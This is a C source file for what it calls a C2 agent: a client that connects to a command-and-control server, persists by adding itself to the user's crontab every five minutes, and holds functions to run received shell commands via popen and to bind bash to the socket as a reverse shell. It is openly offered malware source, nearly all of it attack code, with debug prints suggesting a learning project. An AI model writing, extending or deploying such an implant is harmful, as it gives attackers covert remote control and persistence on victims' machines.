#include <asm-generic/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <getopt.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

void spawn_shell(int socket) {
  dup2(socket,0);
  dup2(socket,1);
  dup2(socket,2);

  char * const argv[] = {"/bin/bash",NULL};
  execvp("/bin/bash",argv);
}

void add_to_cron() {
  const char *args="127.0.0.1 6666";
  char path[1024];
  char temp[]="/tmp/cronXXXXXX";
  char command[512];
  ssize_t len = readlink("/proc/self/exe", path, sizeof(path));
  if(len==-1){
    perror("[Err] Executable path failed");
    return;
  }
  path[len]='\0';
  int fd=mkstemp(temp);
  if(fd==-1){
    perror("[Err] Temp file creation failed");
    close(fd);
    return;
  }
  snprintf(command,sizeof(command), "crontab -l > %s 2>/dev/null", temp);
  system(command);

  FILE *cron=fopen(temp,"a");
  if(cron==NULL){
    perror("[Err] file open failed");
    close(fd);
    return;
  }

  fprintf(cron,"*/5 * * * * %s %s\n", path,args);
  fclose(cron);

  snprintf(command,sizeof(command),"crontab %s",temp);
  if(system(command)!=0){
    perror("[Err] Crontab install failure");
    close(fd);
    return;
  }  

  remove(temp);
  printf("[Debug] File added to crontab!\n");
}

void establish_connection(int socket){
  char command[]="Hello from client";
    printf("[Debug] Sending data\n");
    if(send(socket, command, strlen(command), 0) < 0){
    printf("[Debug] Failed to send data\n");
    recv(socket,command,sizeof(command),0);        
    printf("%s",command);
        
    return;    
  }
}

void execute_command(int socket, char *command) {
  printf("[Debug] Trying to execute command\n");
  char buffer[1024];
  FILE *fp;
  fp=popen(command, "r");
  if(fp==NULL) {
    printf("[Debug] Failed command exec\n");
    strcpy(buffer, "[Err] Command execution failed");
    send(socket,buffer,strlen(buffer), 0);
    return;
  }
  printf("Command executed, trying to send\n");
  if(sizeof(buffer)==0) {
    printf("[Debug] No output, sending empty response\n");
    send(socket, "", 0, 0);
  }
  if(fgets(buffer,sizeof(buffer),fp)!=NULL) {
   printf("[Debug] Sending response\n");
   send(socket,buffer,strlen(buffer), 0);
  } else {
    printf("[Debug] No output, sending empty response\n");
    send(socket, "", 0, 0);
  }
  return;
}

void no_duplicates() {
  int loc_bind=1;
  struct sockaddr_in addr;
  int opt=1;
  int sockd=-1;
  if((sockd=socket(AF_INET, SOCK_STREAM, 0))==-1){
    return;
  }
  setsockopt(sockd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
  fcntl(sockd, F_SETFL, fcntl(sockd, F_GETFL) | O_NONBLOCK); 
}

int main(int argc, char *argv[]) {
  if(argc!=3) {
    printf("./agent <ip> <port>\n");
    return 0;
  }
  int sockd;
  char *ip=argv[1];
  int port =atoi(argv[2]);  
  struct sockaddr_in server_addr;
  //int read_size;  
  //char buffer[1024]; 
  sockd=socket(AF_INET,SOCK_STREAM,0);
  if(sockd<0){
    perror("[Err] Failed socket creation");
    exit(-1);
  }
  server_addr.sin_family=AF_INET;
  server_addr.sin_port=htons(port);
  server_addr.sin_addr.s_addr=inet_addr(ip);
  if(connect(sockd,(struct sockaddr *)&server_addr,sizeof(server_addr))<0){
    perror("[Err] Connection failed");
    close(sockd);
    exit(-1);
  }
  printf("[Info] Connected to C2 at %s:%d\n",ip,port);
  establish_connection(sockd); 
  int read_size;
  char buffer[1024];
  while(1) {
    read_size=recv(sockd, buffer, sizeof(buffer), 0);
    if(read_size >0) {
       buffer[read_size] = '\0';
       printf("[C2] %s", buffer);

    if (strncmp(buffer, "quit", 4) == 0) {
      printf("[Info] Quitting...\n");
      break;
    }
    if (strncmp(buffer, "cron", 4) == 0) {
      printf("[Info] Adding to crontab...\n");
      add_to_cron();
    }

    //execute_command(sockd, buffer);
    }
  }
  close(sockd);

  return 0;
}
